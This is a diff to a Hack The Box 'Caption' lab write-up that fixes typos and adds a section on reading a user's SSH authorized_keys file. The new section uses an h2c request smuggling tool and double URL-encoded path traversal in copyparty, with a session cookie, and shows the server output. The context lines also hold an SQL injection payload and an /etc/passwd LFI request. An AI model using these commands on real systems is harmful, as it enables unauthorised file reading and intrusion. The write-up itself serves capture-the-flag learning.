@@ -3,7 +3,7 @@ layout: writeup
 category: HTB
 date: 2024-12-29
 comments: false
-tags: gitbucket codereview informationleakage apachethrift wfuzz cache varnish haproxy xss crosssitescripting sessionhijacking webcachepoisoning
+tags: gitbucket codereview informationleakage apachethrift wfuzz cache varnish haproxy xss crosssitescripting sessionhijacking webcachepoisoning h2csmuggling smugglingrequest copyparty lfi localfileinclusion
 ---
 
 <br />
@@ -224,7 +224,7 @@ This website shows a login page:
 
 <br />
 
-We try default credentials and some basic SQL Injection payloads `(' or 1=1-- -')`, but without success.
+We tried default credentials and some basic SQL Injection payloads `(' or 1=1-- -')`, but without success.
 
 <br />
 
@@ -297,7 +297,7 @@ ID           Response   Lines    Word       Chars       Payload
 
 <br />
 
-There are some juicy endpoints in the output:
+There are some noworthy endpoints in the output:
 
 - `/home`: 302 redirect -> Typical home page path.
 
@@ -639,7 +639,7 @@ There are three urls related to the `/download` endpoint poiting to log files.
 
 We can use the bypass technique to access them but we don't found nothing relevant.
 
-Another useful step is to enumerate the `root` parth of this `internal` service:
+Another useful step is to enumerate the `root` path of this `internal` service:
 
 <br />
 
@@ -697,7 +697,7 @@ curl -i -s -k -X  GET 'http://127.0.0.1:3923/.cpr/%2Fetc%2Fpasswd'
 
 With the exploit source code we can confirm the port `39323`.
 
-If reply this exploitation with our target, it doesn't work:
+If we try this exploitation against our target, it doesn't work:
 
 <br />
 
@@ -780,7 +780,7 @@ document.documentElement.className=localStorage.theme||"az a z";
 
 This happen because our request is going through multiple proxies and we need to URL-Encode more than one time. 
 
-To solve this, we only need to doble url-encoding the `%` symbols adding a `%25`.
+To solve this, we only need to double URL-encode the `%` symbols adding a `%25`.
 
 <br />
 
@@ -843,4 +843,32 @@ _laurel:x:998:998::/var/log/laurel:/bin/false
 
 <br />
 
-We successfully retrieved the `/etc/passwd` from the victime machine.
+We successfully retrieved the `/etc/passwd` from the victim machine.
+
+There are two users, `margo` and `ruth`. If we are running the requests as some of them we can point to critical files like the user `authorized_keys`.
+
+Let's try it with `margo`:
+
+<br />
+
+```bash
+❯ python3 h2csmuggler.py -x http://caption.htb 'http://caption.htb/download?url=http://localhost:3923/.cpr/%252Fhome%252Fmargo%252F.ssh%252Fauthorized_keys' -H "Cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzUxMzE1MjgxfQ.mvCRs4piEnvcTrPfVV8aCrDrQBw2yNLyZPco8eXzNoc"
+...[snip]...
+[INFO] Requesting - /download?url=http://localhost:3923/.cpr/%252Fhome%252Fmargo%252F.ssh%252Fauthorized_keys
+:status: 200
+server: Werkzeug/3.0.1 Python/3.10.12
+date: Mon, 30 Jun 2025 20:20:43 GMT
+content-type: text/html; charset=utf-8
+content-length: 175
+x-varnish: 131173
+age: 0
+via: 1.1 varnish (Varnish/6.6)
+x-cache: MISS
+accept-ranges: bytes
+
+ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMY5d7Gy+8OLp5/fgComuWw4o/dzKex6KnS1f9H4Dnz2xKQSvNQ4Q4ltrsbUSnZNrBMlNtZvYpE5is5gsDTPKxA= margo@caption
+```
+
+<br />
+
+
